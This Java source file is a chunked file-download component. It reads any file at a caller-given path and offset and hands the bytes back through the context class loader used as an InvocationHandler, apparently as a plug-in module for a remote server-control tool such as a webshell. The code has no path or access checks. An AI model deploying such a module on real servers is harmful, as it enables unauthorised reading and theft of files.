package org.leo.core.component;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.RandomAccessFile;
import java.util.HashMap;

/**
 * 文件下载组件
 * 提供高性能文件分块下载功能，兼容Java 1.5+
 * 
 * @author LeoSpring
 * @version 2.2
 */
public class FileDownloadComponent implements Runnable {
    
    // 性能优化常量
    private static final int DEFAULT_BUFFER_SIZE = 8192; // 8KB缓冲区
    private static final int LARGE_BUFFER_SIZE = 65536;  // 64KB缓冲区，用于大文件
    private static final int MAX_CHUNK_SIZE = 1048576;   // 1MB最大块大小
    
    private HashMap params;
    private HashMap results;


    
    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }

    
    /**
     * 主要执行方法
     */
    public void invoke() throws Exception {
        fileDownload();
    }

    /**
     * 高性能文件下载
     */
    private void fileDownload() throws Exception {
        Object pathObj = params.get("path");
        Object sizeObj = params.get("size");
        Object offsetObj = params.get("offset");

        String path = new String((byte[]) pathObj, "UTF-8");
        
        long size = sizeObj != null ? ((Number) sizeObj).longValue() : 0;
        long offset = offsetObj != null ? ((Number) offsetObj).longValue() : 0;
        
        File downloadFile = new File(path);
        if (!downloadFile.exists()) {
            results.put("code", 404);
            results.put("msg", "文件不存在: " + path);
            return;
        }
        
        if (!downloadFile.canRead()) {
            results.put("code", 403);
            results.put("msg", "文件无读取权限: " + path);
            return;
        }
        RandomAccessFile inputFile = null;
        BufferedInputStream bufferedInput = null;
        
        try {
            inputFile = new RandomAccessFile(downloadFile, "r");
            inputFile.seek(offset);
            
            long availableSize = inputFile.length() - offset;
            if (availableSize <= 0) {
                results.put("code", 416);
                results.put("msg", "请求范围不满足: offset=" + offset + ", fileSize=" + downloadFile.length());
                return;
            }
            
            int readSize = (int) Math.min(size, availableSize);
            readSize = Math.min(readSize, MAX_CHUNK_SIZE); // 限制最大块大小
            
            // 性能优化：使用缓冲读取
            byte[] buffer = new byte[readSize];
            int totalRead = 0;
            
            // 对于大文件，使用分块读取
            if (readSize > LARGE_BUFFER_SIZE) {
                totalRead = readLargeFile(inputFile, buffer, readSize);
            } else {
                // 小文件直接读取
                totalRead = inputFile.read(buffer);
                if (totalRead == -1) {
                    totalRead = 0;
                }
            }
            
            // 如果实际读取的数据少于请求的数据，调整数组大小
            if (totalRead < readSize) {
                byte[] actualData = new byte[totalRead];
                System.arraycopy(buffer, 0, actualData, 0, totalRead);
                buffer = actualData;
            }
            
            // 设置响应状态
            boolean isComplete = (offset + totalRead) >= downloadFile.length();
            results.put("code", isComplete ? 200 : 100);
            results.put("length", downloadFile.length());
            results.put("data", buffer);
            results.put("bytesRead", totalRead);
            results.put("offset", offset);
            results.put("nextOffset", offset + totalRead);
            results.put("isComplete", isComplete);
        } finally {
            // 优化：确保资源正确关闭
            closeQuietly(bufferedInput);
            closeQuietly(inputFile);
        }
    }
    
    /**
     * 大文件分块读取优化
     */
    private int readLargeFile(RandomAccessFile file, byte[] buffer, int targetSize) throws Exception {
        int totalRead = 0;
        int remaining = targetSize;
        while (remaining > 0 && totalRead < targetSize) {
            int chunkSize = Math.min(remaining, DEFAULT_BUFFER_SIZE);
            int bytesRead = file.read(buffer, totalRead, chunkSize);
            
            if (bytesRead == -1) {
                break; // 文件结束
            }
            totalRead += bytesRead;
            remaining -= bytesRead;
        }
        
        return totalRead;
    }
    
    /**
     * 安全关闭资源
     */
    private void closeQuietly(java.io.Closeable resource) {
        if (resource != null) {
            try {
                resource.close();
            } catch (Exception e) {
                // 忽略关闭异常
            }
        }
    }
}
